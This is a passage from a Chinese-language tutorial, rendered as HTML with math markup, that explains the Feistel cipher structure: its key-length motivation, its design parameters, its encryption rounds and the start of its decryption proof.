style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>的值不够大（例如4），那它就和流密码没什么区别，非常容易基于统计规律被攻破；那<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>很大的情况呢？统计规律固然被隐藏了，但是我们提过一句话：<strong>映射表格就是我们的密钥</strong>。对于分组长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>的任意可逆变换，其每种映射需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>位表示（即分组长度），并且我们有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span>中不同分组情况，因此，密钥长度可以表示为</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi><mo>⋅</mo><msup><mn>2</mn><mi>n</mi></msup><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">L(n)=n\cdot 2^n.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mord">.</span></span></span></span></span></p><p>  指数级的增长是十分恐怖的。今天的密钥长度一般不少于64位，如果我们令上式中的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>64</mn></mrow><annotation encoding="application/x-tex">n=64</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">4</span></span></span></span>，其结果是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>21</mn></msup></mrow><annotation encoding="application/x-tex">10^{21}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>位！这个长度是不可接受的。因此，Feistel指出，我们只需要<strong>一种对任意可逆变换的近似</strong>。一般我们认为密钥空间是上面所提到的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">2^n!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">!</span></span></span></span>中的一个子集。于是，我们依靠什么标准来选取这个密钥空间使得其在降低密钥空间大小的情况下依然能保持足够的安全呢？</p><h2 id="feistel的设想"><a class="markdownIt-Anchor" href="#feistel的设想"></a> Feistel的设想</h2><p>  Feistel提出了一种<strong>基于乘积密码的概念来逼近任意可逆变换</strong>的方式。乘积密码是说，<strong>利用不同的两套或多套密码来加密，得到的结果比其中任意一种的加密效果都要强</strong>。特别的，Feistel建议使用<strong>替代</strong>和<strong>置换</strong>的反复使用。替代是指明文中的某一元素或某一组被<strong>唯一地</strong>替换成为密文中的某一元素或某一组；置换是改变明文元素顺序，但明文元素本身并不发生改变。这样的目的是<strong>产生混淆和扩散</strong>，这是香农提出的概念。其大致原理是，使得密文中的某一字符<strong>尽可能多地受到来自不同明文字符的影响</strong>，这样做可以有效抵御基于统计的密码分析。当然，最好的情况是<strong>所有统计规律都独立于密钥的选取</strong>，但这就是我们前面说的<strong>任意可逆变换</strong>，是不能够实际应用的。排除这种可能，由于密文的生成是明文和密钥的函数，因此，密文的统计规律<strong>不可避免出现密钥的信息</strong>。因此，大量使用替代和置换可以使这种关系变得复杂，挫败密码分析，这就是我们要的结果。</p><h2 id="feistel结构的基本特征"><a class="markdownIt-Anchor" href="#feistel结构的基本特征"></a> Feistel结构的基本特征</h2><p>  <strong>分组长度</strong>：不言而喻的，分组长度越大，密码的安全性就越高。正如前面分析的那样，<strong>这种安全性来源于混淆和扩散</strong>。一般的分组长度是64-bit，高级加密标准下是128-bit。</p><p>  <strong>密钥长度</strong>：密钥越长安全性也显而易见的越高。但是这种安全性<strong>建立在牺牲了加解密速度之上</strong>。现代密码学中我们认为64-bit的密钥还不够，一般选取128-bit。</p><p>  <strong>迭代轮数</strong>：迭代轮数是降低统计特征的最好方式。一般的推荐迭代轮数是16。</p><p>  <strong>子密钥产生算法</strong>：我们在前面说过，我们要使用的是<strong>乘积密码的原理</strong>，因此，如何生成每一步的密钥是关键的问题。产生密钥的算法越复杂，安全性就越高。</p><p>  <strong>轮函数</strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span>：轮函数是明文和密钥的函数。同样的，轮函数越复杂，密码安全性越高。</p><p>  <strong>快速加解密</strong>：对称密码的优势之一就是速度快。作为对称加密算法的Feistel结构，也应当保持这样的优势。</p><p>  <strong>简化分析难度</strong>：尽管我们喜欢把算法设计得尽可能使密码分析变得困难，然而将算法设计得易于分析也有它的好处。如果说算法被描述得简单一些，我们就更容易分析出其脆弱性，进而设计更可靠的加密算法。不过，我们后续要介绍的DES并没有简单的分析方式。</p><h2 id="feistel加密算法"><a class="markdownIt-Anchor" href="#feistel加密算法"></a> Feistel加密算法</h2><p>  本节介绍Feistel加密算法，其大致原理可以用下面的图来直观表示。当然我们也会对整个流程做出解释。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/06/03/nS2CC.webp" alt="Feistel加密算法" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">Feistel加密算法</span></div></div><p>  不妨假设我们的明文输入是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>w</mi></mrow><annotation encoding="application/x-tex">2w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>位的。我们先对其分组，分成两部分，每一个部分是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>位长的，并且将它们分别记作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><msub><mi>E</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">LE_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mi>E</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">RE_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。我们对这个明文进行第一次迭代。我们如何获取<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">LE_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>呢？很简单，我们直接将输入数据的右半部分拷贝过来即可，即</p><p class='katex-block katex-error' title='ParseError: KaTeX parse error: No such environment: equation at position 7: \begin{̲e̲q̲u̲a̲t̲i̲o̲n̲}̲    LE_1=RE_0.…'>\begin{equation}    LE_1=RE_0. \end{equation}</p><p>比较复杂的是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">RE_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的获得。</p><p>  我们先选取明文的右半部分<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mi>E</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">RE_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，对其作用轮函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span>，<strong>密钥选择第一把子密钥</strong>，即这部分的运算结果是</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>R</mi><msub><mi>E</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">F(RE_0,K_1).</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">.</span></span></span></span></span></p><p>我们将上述得到的式子和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><msub><mi>E</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">LE_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>作异或运算，于是得到我们需要的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">RE_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，这个过程用数学表达式表示就是</p><p class='katex-block katex-error' title='ParseError: KaTeX parse error: No such environment: equation at position 7: \begin{̲e̲q̲u̲a̲t̲i̲o̲n̲}̲    RE_1=LE_0\…'>\begin{equation}    RE_1=LE_0\oplus F(RE_0,K_1).\end{equation}</p><p>这就是第一轮迭代的结果。我们将这个迭代再重复15次，即一共迭代16次。上面式子(1)(2)用一般地表示方法即为</p><p class='katex-block katex-error' title='ParseError: KaTeX parse error: No such environment: equation at position 7: \begin{̲e̲q̲u̲a̲t̲i̲o̲n̲}̲    LE_i=RE_{i…'>\begin{equation}    LE_i=RE_{i-1},\end{equation}</p><p class='katex-block katex-error' title='ParseError: KaTeX parse error: No such environment: equation at position 7: \begin{̲e̲q̲u̲a̲t̲i̲o̲n̲}̲    RE_i=LE_{i…'>\begin{equation}    RE_i=LE_{i-1}\oplus F(RE_{i-1},K_{i}).\end{equation}</p><p>当我们得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><msub><mi>E</mi><mn>16</mn></msub></mrow><annotation encoding="application/x-tex">LE_{16}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mi>E</mi><mn>16</mn></msub></mrow><annotation encoding="application/x-tex">RE_{16}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 后，我们对这两部分<strong>作最后一次交换</strong>，得到</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><msub><mi>E</mi><mn>17</mn></msub><mo>=</mo><mi>R</mi><msub><mi>E</mi><mn>16</mn></msub><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">LE_{17}=RE_{16},</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>R</mi><msub><mi>E</mi><mn>17</mn></msub><mo>=</mo><mi>L</mi><msub><mi>E</mi><mn>16</mn></msub><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">RE_{17}=LE_{16},</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></span></p><p>于是，上述两段拼接起来就是我们产生的密文。</p><p>  这就是Feistel结构的加密过程。</p><h2 id="feistel解密算法"><a class="markdownIt-Anchor" href="#feistel解密算法"></a> Feistel解密算法</h2><p>  既然其加密算法看上去这么复杂，其解密算法会不会也很复杂呢？答案是<strong>并不是</strong>。其解密算法和加密算法<strong>完全一致</strong>，除了<strong>使用密钥的顺序和加密过程相反</strong>。这样究竟能不能复原出明文，这是我们关心的问题，下面我们给出证明。</p><p>  我们要知道的是，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><msub><mi>E</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">LE_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mi>E</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">RE_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>在我们知道密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">K_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的情况下能不能反解出前一步的密文。我们由式(4)可以知道</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><msub><mi>E</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>R</mi><msub><mi>E</mi><mi>i</mi></msub><mo>⊕</mo><mi>F</mi><mo stretchy="false">(</mo><mi>R</mi><msub><mi>E</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>K</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">LE_{i-1}=RE_i\oplus 